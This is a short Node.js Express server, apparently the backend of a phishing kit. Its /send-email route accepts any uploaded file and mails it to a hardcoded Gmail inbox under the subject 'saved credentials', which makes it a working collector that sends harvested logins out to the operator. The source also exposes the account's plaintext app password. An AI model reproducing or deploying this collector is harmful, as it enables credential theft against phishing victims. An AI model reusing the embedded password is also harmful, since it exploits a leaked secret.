const express = require("express");
const nodemailer = require("nodemailer");
const multer = require("multer");
const cors = require("cors");
const fs = require("fs");
const helmet = require("helmet");

const app = express();
const port = process.env.PORT || 3000; // ✅ Usa el puerto de Render

app.use(cors());
app.use(express.json());

// 🔹 Configurar Helmet para mejorar la seguridad y permitir estilos externos
app.use(
    helmet({
        contentSecurityPolicy: {
            directives: {
                defaultSrc: ["'self'"],
                styleSrc: ["'self'", "https://www.gstatic.com"]
            }
        }
    })
);

const upload = multer({ dest: "uploads/" });

// Configurar Nodemailer con Gmail
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "angelhernan12486@gmail.com",
        pass: "zlaw wxdf owlv djiu"
    }
});

// Ruta para recibir el archivo y enviarlo por correo
app.post("/send-email", upload.single("file"), (req, res) => {
    const file = req.file;

    if (!file) {
        return res.status(400).send("No se ha enviado ningún archivo.");
    }

    const mailOptions = {
        from: "angelhernan12486@gmail.com",
        to: "angelhernan12486@gmail.com",
        subject: "Credenciales guardadas",
        text: "Adjunto el archivo con las credenciales.",
        attachments: [{ filename: file.originalname, path: file.path }]
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send("Error al enviar el correo: " + error.toString());
        }

        fs.unlinkSync(file.path);
        res.send("Correo enviado con éxito: " + info.response);
    });
});

// ✅ Agrega un log para verificar que Render está asignando el puerto
app.listen(port, () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
